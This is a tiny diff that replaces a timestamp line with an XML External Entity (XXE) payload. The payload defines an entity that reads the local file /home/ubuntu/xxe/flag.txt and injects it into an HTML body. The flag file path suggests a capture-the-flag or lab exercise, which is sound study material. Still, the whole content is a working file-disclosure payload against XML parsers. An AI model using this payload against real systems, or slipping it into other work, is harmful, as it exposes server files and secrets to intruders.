@@ -1,2 +1,5 @@
-<timestamp>2012-05-01 T 11:20:29 UTC</timestamp>
+<?xml version="1.0"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "file:///home/ubuntu/xxe/flag.txt" >]>
+<html><head/><body>&xxe;</body></html>
 
